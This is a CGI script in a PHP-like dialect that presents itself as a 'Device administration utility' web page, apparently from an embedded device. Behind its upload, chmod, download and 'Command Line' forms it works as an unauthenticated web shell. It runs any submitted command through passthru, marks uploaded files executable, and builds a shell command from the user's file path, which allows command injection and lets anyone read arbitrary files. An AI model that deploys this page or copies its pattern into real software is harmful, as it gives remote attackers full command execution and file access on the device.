#!/sbin/cgi
<?
if ($REQUEST_METHOD == "POST") {
    if ($action == "download") {
	$filename = $file;
	if (ereg(".*/([^[:space:]/]+)", $file, $res)) {
		$filename=$res[1];
	}
	header("Content-Type: application/x-download");
	header("Content-Disposition: attachment;filename=" + $filename);
        passthru("cat " + $file);
        exit;
    } 
}
>

<html>
<head>
<title>Device administration utility</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">
body, td, th, table {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 12px;
}
th { border: 1px solid #aaa;
background-color: #eee;
color: #900;
text-align: left;
text-indent: 10px;
white-space: nowrap;
margin-left: 10px;
font-size: 14px;
font-weight: normal;
letter-spacing: 0.3em;
width: 100%;
}
td { padding-left: 20px; padding-right: 20px; padding-top: 5px }
table { border: 0px; width: 700px }
pre {
background-color: #FFFCE2; 
border: 1px solid #666; 
padding: 5px 5px 5px 5px;
}
input[type=submit], input[type=reset] {
background: #eee;
color: #222;
border: 1px outset #ccc;
padding: .1em .5em;
}
input[type=text], input[type=file]{ padding: .25em .5em }
input[type=text]:focus, input[type=password]:focus, input[type=file]:focus { 
border: 1px solid #886 
}
input[type=text], input[type=file]{
background: #fff;
color: #000;
border: 1px solid #d7d7d7;
}
</style>
</head>
<body bgcolor=white>
<a href="index.cgi">Main</a>
<table align="center">
<tr><th>Upload File</th></tr>
<tr><td>
<form enctype="multipart/form-data" action="<?echo $PHP_SELF;>" method="POST">
File: <input name="file" type="file" size="45">
<input name="action" type="hidden" value="upload">
<input type="submit" value="Upload!">
</form>
<br>
<? if ($REQUEST_METHOD=="POST" && $action=="upload") {
    chmod($file, "755");
    echo("<pre>\n");
    echo("Uploaded file: " + htmlspecialchars($file) + "\n");
    echo("Uploaded file size: " + $file_size);
    echo("\n</pre>");
    $chmodf = $file;
   }>
</td></tr>
<tr><td>&nbsp;</td></tr>

<tr><th>Chmod</th></tr>
<tr><td>
<form enctype="multipart/form-data" action="<?echo $PHP_SELF;>" method="POST">
File: <input name="chmodf" type="text" size="40" value="<?echo htmlspecialchars($chmodf)>">
Permissions: <input name="chmodp" type="text" size="5" value="<?echo htmlspecialchars($chmodp)>">
<input name="action" type="hidden" value="chmod">
<input type="submit" value="Chmod!">
</form>
<br>
<? if ($REQUEST_METHOD=="POST" && $action=="chmod") {
    echo("<pre>\n");
    chmod($chmodf, $chmodp);
    passthru("ls -la " + $chmodf);
    echo("\n</pre>");
   }>
</td></tr>
<tr><td>&nbsp;</td></tr>

<tr><th>Download File</th></tr>
<tr><td>
<form enctype="multipart/form-data" action="<?echo $PHP_SELF;>" method="POST">
Path: <input name="file" type="text" size="40">
<input name="action" type="hidden" value="download">
<input type="submit" value="Download!">
</form>
</td></tr>
<tr><td>&nbsp;</td></tr>

<tr><th>Command Line</th></tr>
<tr><td>
<form enctype="multipart/form-data" action="<?echo $PHP_SELF;>" method="POST">
Cmd: <input name="exec" type="text" size="40" value="<?echo htmlspecialchars($exec)>">
<input name="action" type="hidden" value="cli">
<input type="submit" value="Execute!">
</form>
<br>
<? if ($REQUEST_METHOD=="POST" && $action=="cli") {
    echo("<pre>\n");
    passthru($exec);
    echo("\n</pre>");
   }>
</td></tr>
</table>
</body>
</html>
